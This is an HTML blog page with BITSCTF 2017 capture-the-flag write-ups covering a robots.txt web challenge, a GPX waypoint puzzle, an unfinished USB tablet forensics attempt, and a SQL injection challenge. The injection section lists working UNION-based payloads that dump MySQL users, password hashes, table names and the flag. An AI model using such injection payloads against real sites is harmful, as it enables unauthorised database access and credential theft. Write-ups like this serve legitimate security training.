@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>BITSCTF 2017 - Write-ups | RawSec</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="security,web,writeups,ctf,misc" />
+    
+    <meta name="description" content="InformationsVersion
+
+
+By
+Version
+Comment
+
+
+
+
+noraj
+1.0
+Creation
+
+
+
+CTF
+Name : BITSCTF 2017
+Website : bitsctf.bits-quark.org
+Type : Online
+Format : Jeopardy
+CTF Time : link
+
+10 - BotBot - web
+Should no">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BITSCTF 2017 - Write-ups">
+<meta property="og:url" content="http://rawsec.ml/en/BITSCTF-2017-writeups/index.html">
+<meta property="og:site_name" content="RawSec">
+<meta property="og:description" content="InformationsVersion
+
+
+By
+Version
+Comment
+
+
+
+
+noraj
+1.0
+Creation
+
+
+
+CTF
+Name : BITSCTF 2017
+Website : bitsctf.bits-quark.org
+Type : Online
+Format : Jeopardy
+CTF Time : link
+
+10 - BotBot - web
+Should no">
+<meta property="og:image" content="http://rawsec.ml/images/ctf.png">
+<meta property="og:updated_time" content="2017-02-05T16:14:16.044Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BITSCTF 2017 - Write-ups">
+<meta name="twitter:description" content="InformationsVersion
+
+
+By
+Version
+Comment
+
+
+
+
+noraj
+1.0
+Creation
+
+
+
+CTF
+Name : BITSCTF 2017
+Website : bitsctf.bits-quark.org
+Type : Online
+Format : Jeopardy
+CTF Time : link
+
+10 - BotBot - web
+Should no">
+<meta name="twitter:image" content="http://rawsec.ml/images/ctf.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="RawSec" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.0.3/jquery.min.js"></script>
+    
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38006582-2', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+
+</head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                        <h2 class="subtitle-wrap">
+                            <p class="subtitle">Security is everywhere</p>
+                        </h2>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/tags/linux/">Linux</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/tags/news/">News</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/tags/security/">Security</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/about/">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="page-title-link" href="/categories/security/writeups/">writeups</a>
+    </h1>
+</div>
+                        <div class="main-body-content">
+                            <article id="post-BITSCTF-2017-writeups" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        BITSCTF 2017 - Write-ups
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-subtitle">
+                <a href="/en/BITSCTF-2017-writeups/" class="article-date">
+    <time datetime="2017-02-04T23:00:00.000Z" itemprop="datePublished">Sunday 5 February 2017 (2017-02-05)</time>
+</a>
+                
+    <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/">misc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/security/">security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeups/">writeups</a></li></ul>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : BITSCTF 2017</li>
+<li><strong>Website</strong> : <a href="https://bitsctf.bits-quark.org/" target="_blank" rel="external">bitsctf.bits-quark.org</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/417" target="_blank" rel="external">link</a></li>
+</ul>
+<h2 id="10-BotBot-web"><a href="#10-BotBot-web" class="headerlink" title="10 - BotBot - web"></a>10 - BotBot - web</h2><blockquote>
+<p>Should not ask for the description of a 5 marker.</p>
+<p>botbot.bitsctf.bits-quark.org</p>
+</blockquote>
+<p>Let’s look at the source code:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line">	Nothing to see here. Maybe try looking up seo .txt</div><div class="line">--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure>
+<p>Now go to <code>http://botbot.bitsctf.bits-quark.org/robots.txt</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Useragent *</div><div class="line">Disallow: /fl4g</div></pre></td></tr></table></figure>
+<p><a href="http://botbot.bitsctf.bits-quark.org/fl4g/" target="_blank" rel="external">http://botbot.bitsctf.bits-quark.org/fl4g/</a> :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BITCTF&#123;take_a_look_at_googles_robots_txt&#125;</div></pre></td></tr></table></figure>
+<h2 id="20-Labour-Misc"><a href="#20-Labour-Misc" class="headerlink" title="20 - Labour - Misc"></a>20 - Labour - Misc</h2><blockquote>
+<p>Follow your heart, for it leads you straight to the answer.</p>
+</blockquote>
+<p>It’s a gpx file:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;</div><div class="line">&lt;gpx version=&quot;1.1&quot; creator=&quot;BITSCTF&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://www.topografix.com/GPX/1/1&quot; xsi:schemaLocation=&quot;http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd&quot;&gt;</div><div class="line"></div><div class="line">&lt;!--Use appropriate brackets and underscores to separate words if you succeed--&gt;</div><div class="line">&lt;wpt lat=&quot;23.71697&quot; lon=&quot;89.45508&quot;&gt;</div><div class="line">&lt;ele&gt;12.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP01-A&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;22.82885&quot; lon=&quot;80.79786&quot;&gt;</div><div class="line">&lt;name&gt;WP02-B&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.88276&quot; lon=&quot;58.81642&quot;&gt;</div><div class="line">&lt;name&gt;WP03-C&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;15.43674&quot; lon=&quot;27.65039&quot;&gt;</div><div class="line">&lt;name&gt;WP04-D&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;12.69179&quot; lon=&quot;17.50781&quot;&gt;</div><div class="line">&lt;ele&gt;288.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP05-E&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;14.91081&quot; lon=&quot;100.47656&quot;&gt;</div><div class="line">&lt;ele&gt;13.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP06-F&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;45.9267&quot; lon=&quot;2.21484&quot;&gt;</div><div class="line">&lt;ele&gt;557.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP07-G&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;4.11852&quot; lon=&quot;102.19922&quot;&gt;</div><div class="line">&lt;ele&gt;67.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP08-H&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;34.85709&quot; lon=&quot;65.84765&quot;&gt;</div><div class="line">&lt;ele&gt;3209.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP09-I&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;28.89086&quot; lon=&quot;68.30859&quot;&gt;</div><div class="line">&lt;ele&gt;116.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP10-J&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.20502&quot; lon=&quot;31.92187&quot;&gt;</div><div class="line">&lt;ele&gt;797.8&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP11-K&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;47.24344&quot; lon=&quot;19.8457&quot;&gt;</div><div class="line">&lt;ele&gt;93.5&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP12-L&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;25.30828&quot; lon=&quot;29.84765&quot;&gt;</div><div class="line">&lt;ele&gt;267&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP13-M&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;18.97119&quot; lon=&quot;-72.28521&quot;&gt;</div><div class="line">&lt;ele&gt;375&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP14-N&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;-13.61609&quot; lon=&quot;17.68359&quot;&gt;</div><div class="line">&lt;ele&gt;1510.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP15-O&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;33.84122&quot; lon=&quot;102.23438&quot;&gt;</div><div class="line">&lt;ele&gt;3426.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP16-P&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;46.89624&quot; lon=&quot;69.53907&quot;&gt;</div><div class="line">&lt;ele&gt;364.4&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP17-Q&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;/gpx&gt;</div></pre></td></tr></table></figure>
+<p>We can open it online with:</p>
+<ul>
+<li><a href="http://www.visugpx.com/index.php" target="_blank" rel="external">http://www.visugpx.com/index.php</a></li>
+<li><a href="http://www.gpsvisualizer.com/map?output_home" target="_blank" rel="external">http://www.gpsvisualizer.com/map?output_home</a></li>
+</ul>
+<p>Take the waypoint in order and write the name of the country:</p>
+<ol>
+<li>WP01-A - Bangladesh</li>
+<li>WP02-B - India</li>
+<li>WP03-C - Turkmenistan</li>
+<li>WP04-D - Sudan</li>
+<li>WP05-E - Chad</li>
+<li>WP06-F - Thailand</li>
+<li>WP07-G - France</li>
+<li>WP08-H - Malesia</li>
+<li>WP09-I - Afganistan</li>
+<li>WP10-J - Pakistan</li>
+<li>WP11-K - Turkey</li>
+<li>WP12-L - Hungary</li>
+<li>WP13-M - Egypt</li>
+<li>WP14-N - Haiti</li>
+<li>WP15-O - Angola</li>
+<li>WP16-P - China</li>
+<li>WP17-Q - Kazaksztan</li>
+</ol>
+<p>Taking the first letter of each country in order give me <strong>BITSCTFMAPTHEHACK</strong> and the comment said:</p>
+<blockquote>
+<p>Use appropriate brackets and underscores to separate words if you succeed</p>
+</blockquote>
+<p>So I get <strong>BITSCTF{MAP_THE_HACK}</strong></p>
+<h1 id="30-Batman-vs-Joker-Web"><a href="#30-Batman-vs-Joker-Web" class="headerlink" title="30 - Batman vs Joker - Web"></a>30 - Batman vs Joker - Web</h1><blockquote>
+<p>Joker has left a message for you. Your job is to get to the message asap.</p>
+<p>joking.bitsctf.bits-quark.org</p>
+</blockquote>
+<p>Try a quick <code>&#39; or 1=1 #&#39;</code>: this is working so we have a vulnerable MySQL database.</p>
+<p>Let’s enjoy SQLi.</p>
+<p>Just curious to know the DB version: <code>&#39; or 1=1 UNION SELECT @@version,1 #</code>: <strong>5.5.54-0+deb8u1</strong></p>
+<p>Current databse name: <code>&#39; or 1=1 UNION SELECT database(),1 #</code>: <strong>hack</strong></p>
+<p>Just curious to list the databse users: <code>&#39; or 1=1 UNION SELECT host, user FROM mysql.user #</code> and <code>&#39; or 1=1 UNION SELECT user, password FROM mysql.user #</code>:</p>
+<table>
+<thead>
+<tr>
+<th>host</th>
+<th>user</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>%</td>
+<td>tester</td>
+<td>*975B2CD4FF9AE554FE8AD33168FBFC326D2021DD</td>
+</tr>
+<tr>
+<td>127.0.0.1, 33842653d6db, ::1, localhost</td>
+<td>root</td>
+<td>*A2AE2E3109CE064A1AED30C0E71E021540F30700</td>
+</tr>
+<tr>
+<td>localhost</td>
+<td>debian-sys-maint</td>
+<td>*A9A6626F5FEE26E9EDDE42FF9274124A98F82A3F</td>
+</tr>
+</tbody>
+</table>
+<p>I want to know the name of tables in the hack databse: <code>&#39; or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = &#39;hack&#39; #</code>:</p>
+<table>
+<thead>
+<tr>
+<th>table_schema</th>
+<th>table_name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>hack</td>
+<td>CIA_Official_Records</td>
+</tr>
+<tr>
+<td>hack</td>
+<td>joker</td>
+</tr>
+</tbody>
+</table>
+<p>And finally I want to know the name of columns in the both previous tables: <code>&#39; or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = &#39;CIA_Official_Records&#39; or table_name = &#39;joker&#39; #</code>:</p>
+<table>
+<thead>
+<tr>
+<th>table_name</th>
+<th>column_name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CIA_Official_Records</td>
+<td>id</td>
+</tr>
+<tr>
+<td>CIA_Official_Records</td>
+<td>username</td>
+</tr>
+<tr>
+<td>CIA_Official_Records</td>
+<td>first_name</td>
+</tr>
+<tr>
+<td>CIA_Official_Records</td>
+<td>last_name</td>
+</tr>
+<tr>
+<td>Joker</td>
+<td>Flag</td>
+</tr>
+<tr>
+<td>Joker</td>
+<td>HaHaHa</td>
+</tr>
+</tbody>
+</table>
+<p>Pretty easy to know where to find teh flag now: <code>&#39; or 1=1 UNION SELECT Flag, HaHaHa FROM Joker #</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>HaHaHa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}</td>
+<td>Enjoying the game Batman!!!</td>
+</tr>
+</tbody>
+</table>
+<h2 id="50-Tom-and-Jerry-Forensics"><a href="#50-Tom-and-Jerry-Forensics" class="headerlink" title="50 - Tom and Jerry - Forensics"></a>50 - Tom and Jerry - Forensics</h2><p><strong>WARNING</strong>: we didn’t solve this challenge, so write-up is incomplete.</p>
+<p>Open the pcapng with Wireshark.</p>
+<p>Device Descriptor tell us:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">idVendor: Wacom Co., Ltd (0x056a)</div><div class="line">idProduct: CTL-460 [Bamboo Pen (S)] (0x00d4)</div></pre></td></tr></table></figure>
+<p>So this is a Pen Tablet.</p>
+<p>We can use a filter <code>usb.transfer_type == 0x01</code> to oly see frame where there is data.</p>
+<p>We can complete the filter with <code>(frame.len == 73)</code> to see only one side of the exchange and <code>!(usb.capdata == 00:00:00:00:00:00:00:00)</code> to hide null data. Finally that give us this filter: <code>((usb.transfer_type == 0x01) &amp;&amp; (frame.len == 73)) &amp;&amp; !(usb.capdata == 00:00:00:00:00:00:00:00)</code>.</p>
+<p>USB transfert type is <em>USB INTERRUPT</em>: <a href="http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt" target="_blank" rel="external">http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt</a></p>
+<p>To extract the data only from the pcapng I used tshark:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r Cat.pcapng -T fields -e usb.capdata &gt; capdata.txt</div></pre></td></tr></table></figure>
+<p>I didn’t have time to search how to interpret the raw data into coordinates.</p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="http://rawsec.ml/en/BITSCTF-2017-writeups/" data-id="ciybeffyu00dm81j3x59x4xom" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>follow:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="flag" href="https://ctftime.org/team/27232" target="_blank">
+                        <i class="icon fa fa-flag"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/noraj1337" target="_blank">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="bitbucket" href="https://bitbucket.org/noraj/" target="_blank">
+                        <i class="icon fa fa-bitbucket"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="gitlab" href="https://gitlab.com/u/noraj" target="_blank">
+                        <i class="icon fa fa-gitlab"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="twitter" href="https://twitter.com/rawsec_cyber" target="_blank">
+                        <i class="icon fa fa-twitter"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="rss" href="/atom.xml" target="_blank">
+                        <i class="icon fa fa-rss"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/en/Insomnihack-2017-Teaser-smarttomcat/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">older</strong>
+        <p class="article-nav-title">Insomni&#39;hack teaser - 50 - smarttomcat - Web</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/BITSCTF-2017-writeups/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="BITSCTF 2017 - Write-ups" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/BITSCTF-2017-writeups/" class="title">BITSCTF 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-02-04T23:00:00.000Z" itemprop="datePublished">Sunday 5 February 2017 (2017-02-05)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/Insomnihack-2017-Teaser-smarttomcat/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="Insomni&#39;hack teaser - 50 - smarttomcat - Web" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/Insomnihack-2017-Teaser-smarttomcat/" class="title">Insomni&#39;hack teaser - 50 - smarttomcat - Web</a></p>
+                            <p class="item-date"><time datetime="2017-01-20T23:00:00.000Z" itemprop="datePublished">Saturday 21 January 2017 (2017-01-21)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/Insomnihack-2017-Teaser-cryptoquizz/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="Insomni&#39;hack teaser - 50 - cryptoquizz - Misc" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/Insomnihack-2017-Teaser-cryptoquizz/" class="title">Insomni&#39;hack teaser - 50 - cryptoquizz - Misc</a></p>
+                            <p class="item-date"><time datetime="2017-01-20T23:00:00.000Z" itemprop="datePublished">Saturday 21 January 2017 (2017-01-21)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/opensuse-install-rtorrent-rutorrent/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/opensuse.svg)" alt="OpenSUSE : Install rTorrent and ruTorrent" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/linux/">linux</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/linux/opensuse/">opensuse</a></p>
+                            <p class="item-title"><a href="/en/opensuse-install-rtorrent-rutorrent/" class="title">OpenSUSE : Install rTorrent and ruTorrent</a></p>
+                            <p class="item-date"><time datetime="2016-12-29T23:00:00.000Z" itemprop="datePublished">Friday 30 December 2016 (2016-12-30)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/C3CTF-33-150-try-web/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="33C3 CTF - 150 - try - Web" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/C3CTF-33-150-try-web/" class="title">33C3 CTF - 150 - try - Web</a></p>
+                            <p class="item-date"><time datetime="2016-12-27T23:00:00.000Z" itemprop="datePublished">Wednesday 28 December 2016 (2016-12-28)</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">categories</h3>
+        <div class="widget">
